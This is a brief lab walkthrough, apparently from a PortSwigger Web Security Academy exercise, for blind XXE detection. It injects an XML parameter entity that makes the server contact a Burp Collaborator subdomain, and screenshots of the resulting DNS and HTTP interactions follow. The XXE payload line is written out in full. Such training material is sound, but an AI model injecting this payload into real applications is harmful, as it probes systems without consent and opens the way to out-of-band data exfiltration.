## Blind XXE with out-of-band interaction via XML parameter entities

## Solution

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ad57a1dd-b82d-4b0e-9903-43994e0812e2">

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result in our payload.

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/c4a30ffb-2ea9-479c-9159-93ae72cf5251">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/712802ff-e5f6-4685-b39d-ef1c077d9c72">

